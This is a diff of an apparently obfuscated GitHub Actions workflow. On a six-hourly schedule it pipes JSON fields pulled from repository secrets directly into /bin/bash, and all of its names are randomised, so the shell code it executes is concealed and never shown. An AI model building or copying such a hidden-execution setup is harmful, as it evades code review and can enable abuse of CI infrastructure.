@@ -2,24 +2,21 @@ name: timowl7
 on:
   workflow_dispatch:
   schedule:
-    - cron: '21 3/6 * * *'
+    - cron: '57 3/6 * * *'
 
-jobs:  # 28214
+jobs:
   build:
     runs-on: ubuntu-latest
-
     steps:
       - uses: actions/checkout@v4
       - name: timowl7
         env:
-          ivzqk27: ${{ secrets.ivzqk27 }}
+          i6: ${{ secrets.i6 }}
         run: |
-          echo $ivzqk27 | jq -r .juydu33801 | /bin/bash
-          echo $qbw7 | jq -r .ic992 | /bin/bash
-          echo $blso4291 | jq -r .e16 | /bin/bash
-          echo $yq53818 | jq -r .jb7337 | /bin/bash
-          echo $imdz0 | jq -r .ty56843 | /bin/bash
-          echo $nyje61 | jq -r .iiw1 | /bin/bash
-          echo $p795 | jq -r .ftwz905 | /bin/bash
-          echo $vlgva669 | jq -r .p145 | /bin/bash
+          echo $i6 | jq -r .s00995 | /bin/bash
+          echo $aru86 | jq -r .gwdf2867 | /bin/bash
+          echo $zvflb24 | jq -r .jwh757 | /bin/bash
+          echo $v682 | jq -r .y0154 | /bin/bash
+          echo $a37610 | jq -r .an12 | /bin/bash
+          echo $p4 | jq -r .x5 | /bin/bash
 
